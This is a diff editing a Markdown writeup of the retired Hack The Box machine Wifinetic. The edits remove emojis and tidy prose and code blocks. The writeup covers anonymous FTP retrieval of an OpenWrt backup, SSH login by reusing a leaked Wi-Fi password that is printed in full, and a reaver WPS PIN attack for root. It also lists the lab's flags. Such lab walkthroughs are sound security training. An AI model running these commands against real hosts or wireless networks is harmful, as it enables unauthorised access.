@@ -18,7 +18,7 @@ cover:
 
 ---
 
-> ⚠️ **Spoiler warning — retired HTB machine.** 
+> **Spoiler warning — retired HTB machine.** 
 > This writeup documents my playthrough of the retired Hack The Box machine **Wifinetic**. 
 > The VPN IPs shown below are the HTB-assigned VPN addresses used during the box (left intact here for reproducibility). Do not attempt this on non-authorised or active systems.
 
@@ -33,7 +33,7 @@ cover:
 
 ---
 
-## 🔍 Recon
+## Recon
 
 Initial scan:
 ```bash
@@ -55,12 +55,11 @@ Anonymous FTP and the router backup archive (backup-OpenWrt-2023-07-26.tar) were
 
 ---
 
-## 📂 FTP enumeration & archive extraction
+## FTP enumeration & archive extraction
 Anonymous FTP allowed downloading files as the ftp user. I downloaded the backup archive and extracted it locally:
 
 ![FTP Anonymous login](/images/wifinetic/ftp_anonymous.png)
 
-# download 
 ```ftp
 get backup-OpenWrt-2023-07-26.tar
 ```
@@ -84,7 +83,7 @@ I also noted local account names recorded in the extracted /etc/passwd.
 
 ---
 
-## 🪪 Initial access — credential reuse → SSH (netadmin)
+## Initial access — credential reuse → SSH (netadmin)
 
 I tried reusing the discovered Wi-Fi password against local accounts from /etc/passwd and successfully logged in as netadmin:
 
@@ -108,9 +107,9 @@ netadmin@wifinetic:~$ cat user.txt
 
 ---
 
-## 📡 Local enumeration — wireless roles & capabilities
+## Local enumeration — wireless roles & capabilities
 
-It is now time to see how we can escalate privileges.
+With a user shell, the next step is privilege escalation.
 
 From the netadmin shell I enumerated network and wireless services:
 
@@ -131,9 +130,7 @@ systemctl status hostapd.service
 ```
 ![Local enumeration - hostapd](/images/wifinetic/hostapd.png)
 
-I used iwconfig as it works similarly to ifconfig, but it is dedicated to wireless networking interfaces. 
-
-It is used to set the parameters of the network interface and configure wireless operation. 
+I used iwconfig, the wireless-specific counterpart to ifconfig, to inspect the radio interfaces:
 
 ```bash
 iwconfig
@@ -146,9 +143,7 @@ iw dev
 ```
 ![Local wireless enumeration - iw dev](/images/wifinetic/iw-dev.png)
 
-The iw dev command lists information about available wireless network interfaces and their capabilities. 
-
-It is part of the iw utility, which is a powerful tool for configuring and managing wireless devices. 
+`iw dev` lists the wireless interfaces and their capabilities.
 
 ---
 
@@ -167,13 +162,15 @@ getcap -r / 2>/dev/null
 ```
 ![Checked file capabilities with getcap](/images/wifinetic/getcap.png)
 
-# ... /usr/bin/reaver = cap_net_raw+ep
+```text
+/usr/bin/reaver = cap_net_raw+ep
+```
 
 /usr/bin/reaver had cap_net_raw, meaning it could perform raw network operations needed for WPS attacks.
 
 ---
 
-## ⚡ Privilege Escalation — WPS PIN attack (reaver)
+## Privilege Escalation — WPS PIN attack (reaver)
 
 **From iw / iwconfig output I identified the AP BSSID:**
 
@@ -210,7 +207,7 @@ root@wifinetic:/home/netadmin# cat /root/root.txt
 
 ---
 
-## 🏁 Flags
+## Flags
 
 User flag: 03687ad349ad3fd2ab27afb86bc10f1b
 
@@ -218,7 +215,7 @@ Root flag: 94866ea86e569ab12e3c2d0f5893db19
 
 ---
 
-## 🔑 Takeaways
+## Takeaways
 
 - Backups leak secrets. Firmware/backups (OpenWrt configs) contained a Wi-Fi passphrase — treat backups as sensitive.
 
@@ -232,46 +229,39 @@ Root flag: 94866ea86e569ab12e3c2d0f5893db19
 
 ---
 
-## ⚙️ Full command summary (ordered)
+## Full command summary (ordered)
 
+```bash
 # Recon
 nmap -sV -sC -oN initial 10.129.229.90
 
 # FTP (anonymous) -> download -> extract
-```bash
 get backup-OpenWrt-2023-07-26.tar
 tar -xvf backup-OpenWrt-2023-07-26.tar
-```
 
 # SSH access (credential reuse)
-```bash
 ssh netadmin@10.129.229.90
-```
-# password:
-```bash
- VeRyUniUqWiFIPasswrd1!
-```
+# password: VeRyUniUqWiFIPasswrd1!
+
 # Local enumeration
-```bash
 ifconfig
 systemctl status wpa_supplicant.service
 systemctl status hostapd.service
 iwconfig
 iw dev
 getcap -r / 2>/dev/null
-```
+
 # Reaver WPS attack (from compromised box)
-```bash
 reaver -i mon0 -b 02:00:00:00:00:00 -vv -c 1
-```
+
 # Escalate to root
-```bash
 su root
 cat /root/root.txt
 ```
+
 ---
 
-## 📚 Resources
+## Resources
 - OpenWrt / router backup forensics guides
 
 - reaver documentation — WPS PIN attack tool
